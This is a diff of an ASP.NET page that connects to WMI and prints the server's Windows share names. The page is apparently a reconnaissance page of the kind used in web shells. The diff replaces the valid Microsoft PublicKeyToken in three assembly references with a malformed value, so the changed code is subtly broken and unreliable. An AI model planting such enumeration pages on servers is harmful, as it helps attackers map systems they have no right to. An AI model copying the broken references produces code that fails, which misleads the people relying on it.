@@ -8,12 +8,12 @@
 <%@ Import Namespace = "System.IO" %>
 <%@ import Namespace = "System.Threading" %>
 <%@ Import Namespace = "System.NET" %>
-<%@ Assembly Name="System.Net.NetworkInformation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
+<%@ Assembly Name="System.Net.NetworkInformation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=6173643616532333463667765" %>
 <%@ import Namespace = "System.Net.NetworkInformation" %>
 
-<%@ Assembly Name="System.Management,Version=4.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+<%@ Assembly Name="System.Management,Version=4.0.0.0,Culture=neutral,PublicKeyToken=6173643616532333463667765"%>
 <%@ import Namespace="System.Management" %>
-<%@ Assembly Name="System.DirectoryServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
+<%@ Assembly Name="System.DirectoryServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=6173643616532333463667765" %>
 <%@ import Namespace="System.DirectoryServices" %>
 <%@ import Namespace="System.DirectoryServices.dll" %>
 <%@ import Namespace="System.DirectoryServices.ActiveDirectory" %>
@@ -26,16 +26,15 @@ try
             scope.Connect()
  
            Dim  worker as ManagementObjectSearcher = new ManagementObjectSearcher(scope,
-                                        new ObjectQuery("select Name,Path from win32_share"))
+                                        new ObjectQuery("select * from win32_share"))
 			dim share as ManagementObject						
             For each share in worker.Get()
 				
 				Response.write(share("Name"))
-				Response.write(" : ")
-				Response.write(share("Path"))
 				Response.write("<br>") 
             
-           Next	
+           Next
+			
 	
 Catch ex As Exception
 	Response.write( ex.tostring)
